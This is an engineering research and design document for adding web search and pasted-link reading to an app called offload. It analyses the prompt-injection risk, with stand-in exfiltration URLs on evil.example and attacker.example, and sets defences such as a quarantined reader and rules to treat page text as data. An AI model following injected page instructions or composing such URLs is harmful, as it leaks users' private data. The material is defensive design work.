# Reaching the web: research, and the questions to answer

> Not a spec. This is the reading behind two specs that do not exist yet, a recommended shape for
> each, and the decisions that are yours rather than mine. Written 2026-09-14.
>
> Sources are linked inline. Where a number is quoted it is from a vendor's own documentation on
> the date above, which is the only kind of vendor claim this repo trusts.

## 0. Decided, 2026-09-14

Answered by the product owner on the first pass, so the rest of this document is read in their
light rather than as open questions.

- **The mitigations in section 2 stand**, including the fetch-only-a-URL-they-gave-us rule and the
  quarantined reader.
- **No MCP.** Revisit when people connect their own tools, and not before.
- **The progress shape in section 4 stands**, and the brief is **free text, short, in offload's
  voice**. Section 8 below says what that costs and how it is kept honest.
- **A cancel appears after ten seconds** and stops the work, not just the watching. Section 9.
- **Start general and narrow later, on evidence rather than on guesses.** This overturns the
  recommendation in section 1 and it is the better call. Section 7 is the revised strategy and the
  telemetry that has to exist for it to be a strategy rather than a hope.

Answered in a second pass the same day:

- **Anthropic's server tools**, not our own provider.
- **Search and the pasted-link reader both ship in the first pass.** A question goes to search, a URL
  they dumped goes to the reader.
- **The reader is quarantined**, which is the answer that reshapes the architecture. Section 11.
- **offload decides when to look something up**, with a switch in settings, defaulting on.
- **A reply cites with a source chip under it**, the shape the thread pills already use.
- **The lookup log is domain, intent and cost.** The intent for a link is derived rather than
  written: domain plus recognised type, so a Spotify track logs as `link:spotify:track` and reads as
  "spotify song link". A search has no domain to derive from and takes a label from the closed list
  in section 7.

And in a third pass:

- **A lookup happens in a shared thread like anywhere else.** One rule everywhere. The quarantined
  reader is what makes that survivable, and it is the reason this answer is defensible rather than
  brave.
- **Three searches and three fetches per turn.** Page text is capped at 10,000 tokens per fetch,
  which is mine to pick and is stated in section 12 with what it is worth.
- **A cancelled turn does not offer Finish.** Stopped means stopped, and the dump is still in the
  conversation if they want to send it again.
- **When a note and the web disagree, the note wins and offload says both.** Copy in section 12.

Nothing is open. The next artifacts are `016/feature-spec.md` and a spec of its own for progress and
cancel.

## 1. The finding that reframes the request

The four examples are four different mechanisms, and only one of them is web search.

| What was asked | What actually answers it | Why not search |
| --- | --- | --- |
| "add a todo on memorial day" | A date rule. Memorial Day is the last Monday in May, which is arithmetic, or one call to a holidays source per country per year, cached. | A search per dump for a fact that changes once a year, and a model reading an ad-funded page to find a date it could have computed. |
| "what's the weather tomorrow" | A weather API. [Open-Meteo](https://open-meteo.com/en/pricing) needs no key and is free under 10,000 calls a day **for non-commercial use**, CC BY attribution. A paid plan or a different vendor is needed the day offload charges anybody. | A search returns a page about the weather. An API returns the weather, typed, with no prose for anything to hide in. |
| "here is an airbnb page" | Open Graph and JSON-LD off the page they pasted. Dates and location, two fields, read once. | Search does not apply at all: they gave us the URL. |
| "here is a spotify link" | [Spotify's oEmbed endpoint](https://developer.spotify.com/documentation/embeds/reference/oembed), public, key-free, returns title, artist, art. Fetch it server side, it sends no CORS headers, and resolve `spotify.link` first because it 308s. | A model reading a rendered Spotify page to guess an artist name that an endpoint returns exactly. |

> **Superseded on 2026-09-14, and the reasoning it was wrong is in section 7.** The table stands as
> a description of what each mechanism does. The conclusion below does not: it optimises the four
> examples somebody happened to think of, and pays for that with a coverage cliff everywhere else.

**The rule this suggested: the narrowest mechanism that answers the question, and search is the last
one, not the first.** Every narrower mechanism is cheaper, faster, more accurate, and carries less
untrusted text into a prompt. Search is what is left when nothing narrower exists.

This matters for scoping more than any guardrail does. A feature called "web search" ends up being
used for everything; a feature called "offload can look up a date, read a link you pasted, and
search the web when it has to" ends up with three narrow things and one general one.

## 2. The security frame

### The lethal trifecta, and where offload stands

Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) is
the clearest statement of the risk: **access to private data, exposure to untrusted content, and the
ability to communicate externally**. Any two are survivable. All three, and a page somewhere can
make the agent take your data and send it away.

offload has two legs today and the third arrives with this feature:

- **Private data**: threads, notes, content, and now the daily-compacted picture of somebody's life.
- **Untrusted content**: already partly true. `notesFromApps` exists because calendar text is
  written by people who are not this person, and the prompt says so in as many words.
- **External communication**: calendar writes exist but are confirmed. **A fetch is itself egress.**
  A request to `evil.example/?note=<what+it+read>` is a data exfiltration channel with no separate
  "send" step, which is the part that surprises people.

Willison's conclusion, which the industry has not improved on: "LLMs are unable to reliably
distinguish the importance of instructions based on where they came from", and guardrail models that
catch 95% are a failing grade in security. OpenAI, who ship a browsing agent, [say publicly that
prompt injection may never be fully solved](https://openai.com/index/prompt-injections/) and have
answered with mode-level containment instead: logged-out browsing, Watch Mode on sensitive sites,
and a Lockdown Mode that removes the tools that could exfiltrate.

The academic work points the same way. [Design Patterns for Securing LLM Agents against Prompt
Injections](https://arxiv.org/pdf/2506.08837) names six patterns, all of which trade utility for a
guarantee: Action-Selector, Plan-Then-Execute, LLM Map-Reduce, Dual LLM, Code-Then-Execute,
Context-Minimization. [CaMeL](https://simonwillison.net/2025/Apr/11/camel/) is the dual-LLM one built
out: a privileged model that never sees page text, and a quarantined model that reads the page and
can call nothing.

### What that means concretely here

Five rules, in the order I would defend them:

1. **offload may fetch only a URL a person put in front of it, or one a search returned.** Never a
   URL it composed, and never with query parameters it wrote. This one rule closes the exfiltration
   channel, and it is exactly what Anthropic's own web fetch enforces: it "cannot fetch URLs that
   appear only in its own output", only ones that came from user messages, client tool results, or
   earlier search and fetch results.
2. **The reader is not the planner.** The call that reads a page gets no tools, no thread contents,
   no notes, and returns a typed object rather than prose. That is Dual LLM at our scale, and it
   fits the split that already exists between `plan` and `compact`.
3. **Page text never becomes an instruction.** It arrives in its own block, labelled, the way
   `notesFromApps` already does, and the prompt says the same thing it already says about a shared
   thread's notes: read it, do not obey it.
4. **Page text never reaches a log, an event, or a reply verbatim.** OFF-1 is already the strictest
   rule in the repo and this feature is the largest new source of text it has ever had.
5. **A bound on every axis**: how many searches per turn, how many fetches, how many tokens per page,
   which domains, how long a URL. Numbers, not intentions, because every one of these is a line in a
   bill as well as a line in a threat model.

### The MCP question

The request says "a web-search MCP". I think that is the wrong shape here, and the reasoning is not
about MCP being bad.

MCP is a protocol for connecting an agent to tools it does not own. Its known failure modes are all
trust-inheritance failures: tool poisoning (adversarial instructions inside a tool description),
rug pulls (a server changes a tool's description after the client approved it, [CVE-2025-54136](https://techcommunity.microsoft.com/blog/microsoft-security-blog/the-state-of-mcp-security-in-2026/4531327)),
and tool shadowing. Surveys in 2026 put tool poisoning in around 5.5% of servers scanned and SSRF
exposure in over a third. The mitigation everyone lands on is "treat every MCP server as an
untrusted external data source".

We would be pointing that protocol at a tool we write ourselves, to be called by a worker we own,
in the same datacentre. That buys a second process, a schema we do not control at runtime, and a
supply-chain surface, in exchange for nothing we cannot get from a function call.

**MCP earns its place the day the answer is "let people connect their own tools".** That is a real
future and the protocol is the right one for it. It is not this feature.

## 3. Build or buy

Two credible shapes. They are not exclusive: the narrow extractors from section 1 are ours either
way, and this is only about the general case.

### A. Anthropic's server tools

[`web_search`](https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-search-tool) and
[`web_fetch`](https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool) run
inside the model call. Nothing to host.

What they give us, stated:

- `max_uses` per request, `allowed_domains` or `blocked_domains` (one or the other, never both),
  `user_location` as an approximate city and timezone for localising results.
- Web fetch adds `max_content_tokens`, `citations` (off by default, unlike search where citations are
  always on), and `use_cache` (default true).
- Fetch is restricted to text, HTML and PDF, refuses private addresses and anything `robots.txt`
  disallows, caps a URL at 250 characters, does not render JavaScript, and enforces the
  prior-context rule above.
- Errors come back in-band with a 200 and an `error_code`, so a failed search is data for the model
  rather than an exception for us.
- A long turn can come back `stop_reason: "pause_turn"`, which our loop would have to resend
  unchanged. Our loop does not do this today.

Cost: search is **$10 per 1,000 searches** plus the tokens the results occupy. Fetch adds **no
charge beyond tokens**, and the token side is the real cost: Anthropic's own sizing is roughly 2,500
tokens for a 10 kB page and 125,000 for a 500 kB PDF.

The catch worth naming: search results and fetched pages land in our context as blocks we must pass
back verbatim, including `encrypted_content`, or the next request 400s. That is fine, and it means
page text lives in the conversation we are responsible for under OFF-1.

### B. Our own search provider plus our own fetcher

A search API (Brave, Exa, Tavily and others) called from the Core API, and a fetcher we write.

What it buys: total control of what is logged, cached and stored, our own quarantined-reader shape,
per-account rate limits, and no vendor in the loop that we cannot instrument.

What it costs: we own SSRF defence, redirect handling, robots, content-type sniffing, size caps,
PDF extraction, and a cache. Each of those is a place this repo has been bitten before by assuming a
library does the obvious thing.

**My recommendation**: start with A for search and fetch, because every guardrail in section 2 is
already a parameter rather than code we have to write, and because the prior-context rule is worth
more than anything we would build in a month. Keep the narrow extractors in B, ours, because a
Spotify oEmbed call is fifteen lines and a model call for it would be absurd.

## 4. Saying what it is doing

### What the research says

Jakob Nielsen's [response time limits](https://www.nngroup.com/articles/response-times-3-important-limits/)
are the ground truth and they have not moved: 0.1s feels instant, 1s keeps a train of thought, and
past **10 seconds** attention is gone and the work needs a progress indicator and a way out.

offload's turns today sit between 2 and 13 seconds, from the worker's own logs. A search turn will
cross 10 regularly. So the ask is right, and it is not a cosmetic one.

Two implementation patterns are worth copying:

- **Semantic step events, not token streams.** The OpenAI Agents SDK separates raw token deltas from
  [`RunItemStreamEvent`](https://openai.github.io/openai-agents-python/streaming/), which fires when
  a whole item is done: a tool ran, a message was produced. That is the right granularity for "say
  what it is doing" and it is the granularity our tool loop already has.
- **Transient parts.** The Vercel AI SDK marks status parts [`transient`](https://ai-sdk.dev/docs/ai-sdk-ui/streaming-data):
  streamed to the client, never added to message history. That is precisely "we do not need a log,
  just the last step", and it is also the OFF-1-safe shape, because nothing that is never stored can
  leak from storage.

The deep-research products go much further, with an activity pane and a step list. The
[comparisons](https://www.franciscomoretti.com/blog/comparing-deep-research-uis) are consistent that
the pane's value fades fast during routine browsing. offload should not build one.

### What this repo's own rules force

Two constraints that make our answer different from Claude Code's.

- **offload never diagnoses itself** (CLAUDE.md, and OFF-5). A brief says what is happening. It
  never says why it is slow, never names a vendor, and never explains a failure.
- **OFF-1**: content does not go into events or logs. "Searching for flights to Lisbon on the 14th"
  is content. That single sentence is the hardest question in this half of the feature, and it is
  question Q11 below.

### The shape I would propose

- One line, the **last** step only, replacing itself. No list, no history, no timestamps.
- It appears only after a threshold, around 1.5 to 2 seconds, so an ordinary two-second filing never
  shows one and nothing flickers.
- It travels on the rails that already exist: the worker posts a step to an internal endpoint, the
  Core API writes it to one column and `pg_notify`s the channel `answers.ts` already listens on, and
  the SSE loop in `dumps.ts` sends a `step` event. `GET /v1/messages/:id` returns the current step
  too, so a client that reconnects or falls back to polling catches up rather than seeing nothing.
- It is cleared when the turn settles. The column holds the current step, never a log.
- The 👀 marker and the existing writing indicator stay; this replaces neither.

## 5. What the privacy policy says, and will have to say

`apps/web/src/app/(marketing)/privacy/page.tsx` is a claim surface, and this feature breaks at least
two of its claims as written. Per CLAUDE.md this is flagged before code, not after.

- **A new class of recipient.** Today the page can say content goes to the model provider and to
  connected apps somebody chose. After this, a site somebody linked to receives a request from us,
  and a search provider receives a query derived from what they wrote. Neither is a company they
  picked.
- **A query is content.** "What time does the Alfama flat check in" is the person's own sentence
  leaving the building. The policy has to say a search query derived from a dump goes to a search
  provider, or the policy is untrue.
- If we use Anthropic's server tools, the recipient is the same company we already name, which is
  the smaller change. That is a genuine point in favour of option A and it belongs in the decision.

## 6. The two specs I would write

### 016, reaching the web

Acceptance criteria, as a skeleton to argue with:

- AC-1 A dump that needs a public fact gets one, and a dump that does not never triggers a lookup.
- AC-2 offload fetches only a URL that a person put in the conversation, or one a search returned.
  A URL it composed itself is refused by the server, not by the prompt.
- AC-3 Page text and search results arrive in their own labelled blocks and are never treated as
  instructions, with the `notesFromApps` wording as the precedent.
- AC-4 Nothing fetched or searched reaches a log line, an analytics event, or a reply verbatim.
- AC-5 Per-turn bounds hold and are stated: searches per turn, fetches per turn, tokens per page,
  total added tokens per turn.
- AC-6 A pasted link from a known provider is read by the narrow extractor, not by a model.
- AC-7 A lookup that fails says one short clause and the turn still files what it could.
- AC-8 A reply that used the web names its source in a way somebody can open, because search
  citations are contractually required when output is shown to people.
- AC-9 Cost per turn is measurable in the existing ledger, with search requests counted separately.

### 017, saying what it is doing

- AC-1 A turn that takes longer than the threshold shows one line saying what is happening now.
- AC-2 Only the latest step is shown, and it is replaced rather than appended.
- AC-3 The line never explains a failure and never names a vendor or a mechanism.
- AC-4 A client that reconnects mid-turn sees the current step, not nothing.
- AC-5 Nothing in a step is stored beyond the turn or written to a log.
- AC-6 Web and both phones show it, with the composer and the thread screen agreeing.
- AC-7 A turn under the threshold shows exactly what it shows today.

## 7. General first, narrow later, on evidence

**The product owner's call, and it is right.** Building a tool per question means watching which
questions get asked, building a tool, and watching again, forever. Coverage is a cliff rather than a
slope: the questions with a tool are exact and everything else is unanswerable, and which side of
that line a question falls on is invisible to the person asking.

Three arguments beyond the one they made:

- **"What date is Memorial Day" is a bad example of a narrow tool and a good example of why they are
  hard.** A holidays API needs a country, a region within it, observed-versus-actual rules, moveable
  feasts, and a religious calendar or two. And the class it belongs to, "when is a thing", contains
  the Super Bowl, a school term, and a local festival, none of which any holidays API has.
- **One mechanism is one threat model.** Every narrow integration is another vendor, another set of
  failure modes, another thing to keep current. The security argument that pointed at narrow tools
  was about the size of the untrusted text, and that is better handled by bounds on the general
  mechanism than by having fewer of them.
- **You cannot know what to build until it is used.** Which is the whole of their argument, and the
  only reason the first version of this document did not make it is that I optimised the four
  examples in the request instead of the distribution behind them.

### Where I would qualify it

**Reading a link somebody pasted is not a narrow tool, it is the second general mechanism.** Open
Graph and JSON-LD are one extractor over a class, not an integration per site: Airbnb, Spotify, a
recipe, a news article and a GitHub repo all publish them. It is also the only thing that can work
for a link like an Airbnb listing, which search cannot find and cannot read for us.

So the shape is **two general mechanisms, not one**:

- **A question** goes to search.
- **A link they pasted** goes to the reader, which tries structured metadata first and falls back to
  reading the page.

Everything else, weather included, is an optimisation added later when the counters say it is common.
Weather is the one I would expect to graduate first, and not for coverage: search returns prose about
the weather and an API returns numbers, and numbers are what a timeline can draw.

### The telemetry that makes this a strategy

This only works if the aggregate is real, and there is a trap in "log the searches anonymously".

**A search query is content.** It is the person's own sentence, or a sentence derived from it, and
OFF-1 says content does not go into a log or an event. Anonymising it does not help: a query is
often uniquely identifying on its own, which is the whole reason search logs have been a privacy
disaster everywhere they have leaked. A pasted URL is content for the same reason.

So the counter cannot be the query. It has to be something the model produces alongside it:

1. **A closed label per lookup**, chosen by the model from a versioned list, and it is the label that
   gets counted. First cut: `weather`, `when_is`, `place`, `opening_hours`, `price_or_availability`,
   `link_metadata`, `person_or_org`, `how_to`, `other`. Nothing else is stored, and the label is one
   of a fixed set of strings, so the event carries no content by construction (AC-18's rule).
2. **The outcome**: did the answer get used in the reply, did the turn file anything because of it,
   did it fail. A tool used a thousand times whose answer is never used is a tool to delete.
3. **A domain tally with no owner.** One table, `domain, day, count`, with no account id and no
   message id and no foreign key to either. That answers "spotify.com was read four hundred times"
   without any row that ties a domain to a person, which is the only version of this I would put my
   name to. It is aggregate by construction rather than aggregate by policy.
4. **Cost per label**, from the ledger that already exists, so "add a weather tool" is argued in
   money as well as in counts.

**Two things that keep the closed set closed.** The label is model output, which means it is a free
string until something checks it: anything outside the set is stored as `other` and the string is
discarded, or the field quietly becomes the open text box this whole design exists to avoid. And the
domain tally needs a floor, because a count of one on a rare personal domain in an invite-only alpha
is re-identifying to anybody who knows who was awake that day. Suppress below a small threshold, or
bucket rare hosts.

**The `other` bucket is the one that decides whether this worked.** If it is small, the taxonomy is
describing what people actually ask. If it is most of them, the taxonomy is wrong, and the answer is
to revise the list against real conversations by hand, not to start logging free text because the
labels were disappointing. Writing that down now, because the pressure to log the query is going to
be strongest exactly when the labels stop being informative.

## 8. Anthropic's server tools, in more detail

This is the part that decides how much of the feature we write. A server tool is not a tool we
implement: the API runs it inside our own model call.

**The mechanics that change our loop.**

- A `server_tool_use` block appears in the response with an `srvtoolu_` id, and its result block,
  for example `web_search_tool_result`, arrives in the same assistant turn, paired by `tool_use_id`.
  **We never return a `tool_result` for it.** Our loop currently assumes every `tool_use` is ours to
  answer, and that assumption breaks here.
- **`pause_turn`.** A long turn can come back with `stop_reason: "pause_turn"` and we continue it by
  sending the assistant content back unchanged, with the same tools. It can pause more than once. Our
  loop has `MAX_MODEL_CALLS` and no notion of this, so a paused turn would today look like a turn
  that stopped.
- **Mixing ours and theirs in one turn is the sharp edge.** If Claude calls `web_search` and one of
  our tools in the same parallel group, the API does **not** run the search. It returns
  `stop_reason: "tool_use"` with the `server_tool_use` block present and no result block, and the
  search runs only when we send back our own `tool_result` blocks. There is no flag for this: the
  documented way to detect it is a `server_tool_use` id with no matching result block. And the
  follow-up user message must contain **nothing but** `tool_result` blocks, or the request 400s. Our
  loop appends results as a user message already, which is the right shape, but it also drops tools
  it does not recognise, which would break the continuation.
- **Round-tripping is mandatory.** Search results carry `encrypted_content` and citations carry
  `encrypted_index`, and both must go back verbatim on later turns or the request fails validation.
  Our conversation history is rebuilt from our own database rather than kept as API blocks, so this
  is a real piece of work rather than a detail.

**The controls, all of them per request.**

- `max_uses` on each tool. `allowed_domains` or `blocked_domains`, never both, no scheme, subdomains
  included automatically, paths supported for search and ignored for fetch, wildcards allowed only
  in the path. Invalid formats 400 at request time. The docs carry an explicit **homograph warning**:
  use ASCII-only entries, because a Cyrillic `а` in `аmazon.com` reads as `amazon.com` and is not.
- Fetch adds `max_content_tokens`, `citations` (off by default), and `use_cache` (on by default).
- Console settings at the organisation level sit above all of this, and a request-level allow list
  must be a subset of the organisation's.

**Zero data retention.** The basic versions, `web_search_20250305` and `web_fetch_20250910`, are ZDR
eligible. The newer dynamic-filtering versions are **not**, because filtering runs inside code
execution, unless we set `allowed_callers: ["direct"]` and give up the filtering. Dynamic filtering
is the feature that keeps page text out of the context window by writing code to filter it first,
which is exactly what we want for cost and for OFF-8, so this is a genuine trade rather than a
formality. There is also a caveat worth repeating to a lawyer: even under ZDR, a site we fetch can
retain whatever appears in the URL we requested.

**What it costs to stop writing it ourselves.** No SSRF defence, no robots handling, no redirect
chain, no PDF extractor, no cache, no rate limiter, and the prior-context URL rule enforced by
somebody else's server rather than by our own diligence. Against that: three changes to the loop
that are not small, and an API-shaped conversation history.

## 9. Cancel

Nielsen's rule is that anything past ten seconds needs a way out, and the product owner has asked for
one at exactly that mark. It is also the first control in offload that stops work rather than undoing
it.

**What it has to do, in order of how much it matters.**

1. **Stop the watching.** The client closes the stream, clears the brief, and gives the composer
   back. Optimistic, immediately, whatever the server says next.
2. **Stop the work.** The turn's job is marked cancelled and the worker is woken through the same
   `pg_notify` rail `answers.ts` already uses, on its own channel. The worker cancels the asyncio
   task, which aborts the in-flight request to the model.
3. **Keep what landed.** Anything already filed stays filed. Cancel is not undo, and we have undo.
   The turn settles as `partial` with whatever it had, which is a state the clients already draw and
   which already offers the way to finish it. That is the whole reason not to invent a new one.
4. **Say one short thing.** "Stopped." and the thread pills for anything that landed. Not an
   apology, not an explanation.

**The edges that need a decision rather than an implementation.**

- **Cancel is best effort and must never lose a write.** If the model has already returned and the
  result is being posted, the post wins. A cancel that arrives during a tool call waits for that call
  rather than interrupting a transaction.
- **Tokens already generated are billed.** An aborted request does not refund what the model produced
  before the abort. Worth stating in the ledger so a cancelled turn does not look free.
- **A cancelled turn is not a failed turn.** It should not retry, should not count against the
  failure alarms, and should read differently from "offload could not finish that".
- **Ten seconds from when?** From the dump being accepted, or from the first brief. I would use the
  first, because the person's clock starts when they press send.

## 10. The questions still open, and what I would answer

**Scope**

- **Q1. Two general mechanisms, or one?** Section 7 argues for search plus a reader for pasted links,
  and for weather graduating later on evidence. Confirm or cut it to search alone for the first pass.
- **Q2. Does a person ask for it, or does offload decide?** Recommendation: offload decides, because
  "you dump things in and offload does the filing" and asking would be filing by another name. The
  risk is a lookup on a dump that wanted none, which is a cost and a latency problem rather than a
  safety one.
- **Q3. Is there a control to turn it off?** A settings toggle is cheap and is the honest answer to
  somebody who does not want their sentences leaving. Related: does it default on?
- **Q4. Does it read pages inside a shared thread?** Content other members wrote is already the
  repo's sharpest injection surface. I would start with no.

**Mechanism**

- **Q7. Which domains, if any, are allowed or blocked?** `allowed_domains` is the strongest control
  we get for free and it is also the one most likely to make the feature feel broken. My instinct is
  a block list for the obvious hostile categories rather than an allow list, plus an allow list for
  the narrow extractors, which are per-provider by definition.
- **Q8. Does the reader get its own model call with no tools?** Recommendation yes, and it is the one
  piece of architecture I would not trade away.

**Bounds**

- **Q9. What are the numbers?** Searches per turn, fetches per turn, `max_content_tokens`, and a
  ceiling on total tokens added by the web in one turn. We have just been taught by the eleven-item
  list that a bound picked for the bill becomes a bound on the product, so pick each one against a
  real example and write the example next to it.
- **Q10. What is the monthly ceiling, and what happens at it?** At $10 per 1,000 searches a heavy day
  is pennies for one person and is not for a thousand. The question is what the product does when an
  account is over: refuse quietly, degrade to no search, or tell them.

**Progress**

- **Q12. What is the threshold before the first line appears?** I would start at 1.5s.
- **Q13. Does the line survive an app restart?** It costs a column either way. My instinct is that
  the current step is worth reading on reconnect and worth nothing after the turn ends.

**Truth**

- **Q15. How does a reply cite what it read?** Anthropic's terms require citations when search output
  is shown to people. Our replies are one or two sentences and name no threads by design, so a
  citation is a new kind of object in the reply. This needs the design system before it needs code.
- **Q16. What does offload say when the web contradicts what it already knew?** A note says one thing
  and a page says another. The notes rule is "where two disagree, the later one is true", and that
  rule was written about notes, not about the internet.

**Free text, now that it is decided**

- **Q17. Where may a brief not go?** The rule I would write: a brief is shown to the person whose
  content it describes, and goes nowhere else. Never a log line, never an analytics event, never
  stored past the turn, never inside an error we report. OFF-1 is about egress and about logs, and a
  sentence shown to its own author breaks neither, which is why free text is allowable here at all.
- **Q18. What does a brief say when it has nothing to say?** Between two steps there is a gap. Keep
  the last one on screen, or fall back to the writing indicator. I would keep the last one: a line
  that disappears reads as something going wrong.
- **Q19. How short is short?** I would cap it hard, around 40 characters, and enforce the cap in code
  rather than in the prompt, the way `say` is capped at 600 today.

**Cancel**

- **Q20. Does a cancelled turn keep the brief's last line?** "Stopped." replaces it, or sits under it.
- **Q21. Can a cancelled turn be resumed?** `partial` already offers Finish, and I think it should
  keep offering it. The alternative reading is that cancel means stop, and offering to continue is
  arguing with them.


## 11. What the quarantined reader does to section 8

Choosing a quarantined reader **and** Anthropic's server tools is not a compromise between the two.
It is better than either, and it is worth writing down why, because the reasoning is not obvious.

**The server tools move out of the planner's loop entirely.** The planner gets one ordinary client
tool, `look_up`, which takes a question or a URL. The worker answers it with a **separate, short
model call** that has `web_search` and `web_fetch` enabled, no thread contents, no notes, and no
ability to file anything. That call returns a typed object: an answer, the fields that were asked
for, and the sources. The planner never sees page text or a search snippet, only the object.

Every problem in section 8 belongs to the sub-call now, and most of them stop being problems:

- **`pause_turn`** happens inside a conversation we hold in memory for two seconds and then throw
  away. No stored history, no encrypted blocks to round-trip, no schema change to `messages`.
- **Mixing server and client tools in one turn** cannot happen, because the sub-call has no client
  tools at all. That was the sharpest edge in the whole integration and it is now unreachable.
- **`encrypted_content` and `encrypted_index`** never have to survive a database round trip, because
  the conversation that contains them never leaves the function that made it.
- **The prior-context URL rule becomes ours to enforce, and it is nearly as strong as it looks.**
  Web fetch can only fetch URLs that appeared earlier in *that* conversation, and we build that
  conversation, so we decide which URL is in it.

  **The first draft of this said there is then "no second URL the tool is permitted to reach", and
  that was wrong.** The provider's own rule counts an earlier *fetch result* as prior context, so a
  page that prints `attacker.example/verify?id=...` has put a URL into the conversation and a second
  read of it is allowed. Found by the security review on 2026-09-14. The fix is a number rather than
  a sentence: one fetch per pasted link, which makes the second read impossible rather than
  discouraged. 016's bounds section carries it.
- **Citations arrive as fields** rather than as prose to be parsed, which is what the source chip
  needs and what 005 already settled for thread links: the link comes from the record, never from the
  sentence.

What it costs: one extra model call per lookup, its latency, and the fact that the planner's answer
is only as good as the object the reader returned. The second one is the real trade. A reader that
returns the wrong three fields has lost information the planner might have used, and unlike the
inline version there is no way for the planner to go back and look.

**So the reader's output shape is the design.** Not a summary string. A small typed object per kind
of lookup, with the sources attached, and an `unsure` path that says so rather than guessing.

**And the sources are two fields, `domain` and `url`, deliberately.** A provider's citation also
carries the page's title and a quoted excerpt, and forwarding either would walk attacker-controlled
prose straight past the quarantine and onto somebody's screen. The one door nobody was watching.

**The reader is a model call like any other and goes through the same masked harness.** It is a new
call site, built outside `plan` and `compact`, and it is the largest new source of untrusted text
the system has ever had. "No content in Langfuse" is enforced by the wrapper every other call uses,
so a bespoke client here would bypass the control that makes hosted tracing acceptable at all.


## 12. The three calls I made rather than asked about

**The page-text cap: 10,000 tokens per fetch.** Three fetches makes 30,000 tokens of attacker
controlled text in the worst case, which sounds alarming until you notice where it lands. **It lands
in the reader's throwaway conversation, not in the planner's prompt.** The planner receives the
typed object, which is a few hundred tokens whatever the page was. So OFF-8's rule, that nothing in a
prompt grows with the account, is protected by the architecture rather than by the cap, and the cap
is doing a different job: bounding the bill and bounding how much text one poisoned page can spend
arguing with the reader. Ten thousand tokens is roughly a 40 kB page, which reads a long article and
truncates a documentation site, and Anthropic's own sizing is the source for that arithmetic.

**Naming both sides of a disagreement, in offload's voice.** The instruction was "you said 14th but
internet says memorial is ...", and the intent is clearly that both numbers appear. Proposed copy:

> Your note says the 14th. Memorial Day is the 25th.

Two short sentences, both facts, no mechanism. It deliberately does not say "the internet says",
because the source chip under the reply is already saying exactly that, with a link, and saying it
twice in two registers is how a reply starts explaining itself. If the preference is for the word to
appear in the sentence, that is a copy change and not a design one.

**Cancel does not retry, alarm, or count as a failure.** It is a fourth outcome alongside answered,
partial and failed, and the only one a person asked for. It reuses `partial`'s record of what landed
and suppresses `partial`'s offer to finish, which is a flag rather than a state.
